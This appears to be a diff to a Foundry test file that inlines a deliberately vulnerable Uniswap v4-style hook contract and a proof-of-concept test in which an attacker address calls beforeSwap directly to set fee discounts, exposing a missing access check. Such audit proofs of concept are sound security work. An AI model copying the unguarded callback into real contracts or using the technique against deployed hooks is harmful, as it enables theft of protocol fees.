@@ -1,8 +1,29 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.24;
+pragma solidity ^0.8.20;
 
 import "forge-std/Test.sol";
-import "../../examples/sample_v4_hook_and_erc4626.sol";
+
+contract VulnerableUniswapV4Hook {
+    address public poolManager;
+    mapping(address => uint256) public feeDiscount;
+
+    constructor(address _poolManager) {
+        poolManager = _poolManager;
+    }
+
+    function beforeSwap(
+        address /* sender */,
+        bytes32 /* poolKey */,
+        int256 /* amountSpecified */,
+        bytes calldata hookData
+    ) external returns (bytes4) {
+        if (hookData.length > 0) {
+            address beneficiary = abi.decode(hookData, (address));
+            feeDiscount[beneficiary] = 10;
+        }
+        return this.beforeSwap.selector;
+    }
+}
 
 contract POC_V4Hook_TransientReentrancy is Test {
     address internal attacker = address(0xBAD);
@@ -15,7 +36,6 @@ contract POC_V4Hook_TransientReentrancy is Test {
         vm.deal(attacker, 10 ether);
     }
 
-    /// @notice Proves that unauthorized third-party callers CAN invoke hook callbacks and manipulate fee discount state
     function test_Exploit_UnauthorizedCallerManipulatesHookState() public {
         assertEq(targetHook.feeDiscount(beneficiary), 0, "Initial fee discount must be 0");
 
@@ -25,11 +45,9 @@ contract POC_V4Hook_TransientReentrancy is Test {
         bytes4 selector = targetHook.beforeSwap(attacker, bytes32(0), 1000, hookData);
 
         assertEq(selector, targetHook.beforeSwap.selector);
-        // Vulnerability proven: attacker successfully modified feeDiscount to 10
         assertEq(targetHook.feeDiscount(beneficiary), 10, "Attacker failed to alter fee discount");
     }
 
-    /// @notice Invariant test verifying that the configured poolManager is not zero
     function test_PoolManagerConfigured() public view {
         assertEq(targetHook.poolManager(), poolManager);
     }
